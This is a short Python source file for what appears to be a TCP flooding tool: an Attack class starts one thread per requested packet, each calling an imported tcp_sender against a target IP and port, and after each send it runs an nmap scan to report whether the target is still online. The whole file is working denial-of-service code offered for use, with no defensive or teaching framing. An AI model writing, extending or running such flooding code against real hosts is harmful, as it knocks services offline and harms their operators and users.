from lib.util.debug import Debug
from lib.util.send_tcp import tcp_sender
import nmap, socket
from lib.util.colors import colors
import threading
class Attack:
	def __init__(self, ip, port, packets):
		self.ip = ip
		self.port = port
		self.packets = packets
	def attack(self):
		total = 0
		for x in range(0, int(self.packets)):
			threading.Thread(target=tcp_sender, args=(self.ip, self.port), daemon=True).start()
			total+=1
			scanner = nmap.PortScanner()
			host = socket.gethostbyname(self.ip)
			scanner.scan(host)
			status = scanner[host].state().replace('up', f'{colors.reset}{colors.green}ONLINE{colors.reset}').replace('down', f'{colors.reset}{colors.red}OFFLINE{colors.reset}')
			Debug(f'[*] {total} packages have been sent {colors.reset}[{status}]', verbose=True)
		Debug(f'[+] Sent {total} packets', verbose=True)


